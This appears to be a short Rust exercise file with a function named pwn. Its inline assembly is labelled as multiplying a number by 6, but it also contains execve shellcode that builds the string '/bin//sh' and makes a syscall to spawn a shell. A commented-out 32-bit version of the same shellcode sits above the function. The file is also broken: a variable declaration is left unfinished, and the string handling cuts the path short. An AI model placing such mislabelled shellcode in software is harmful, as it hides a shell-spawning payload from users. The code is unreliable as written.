use std::arch::asm;

// push eax
// push dword 0x68732f2f
// push dword 0x6e69622f
// mov ebx,esp
// push eax
// push ebx
// mov ecx,esp
// cdq
// mov al,0xb
// int 0x80

pub fn pwn()
{
    // Multiply x by 6 using shifts and adds
    let mut x: u64 = 4;

    let mut rcx:
    unsafe {
        asm!(
            "mov {tmp}, {x}",
            "shl {tmp}, 1",
            "shl {x}, 2",
            "add {x}, {tmp}",

            "mov rcx, 0x68732f2f6e69622f",
            "shl rcx, 0x08",
            "shr rcx, 0x08",
            "push rcx",
            "lea rdi, [rsp]",
            "xor rdx, rdx",
            "mov al, 0x3b",
            "syscall",

            x = inout(reg) x,
            tmp = out(reg) _,
        );
    }
    assert_eq!(x, 4 * 6);
}
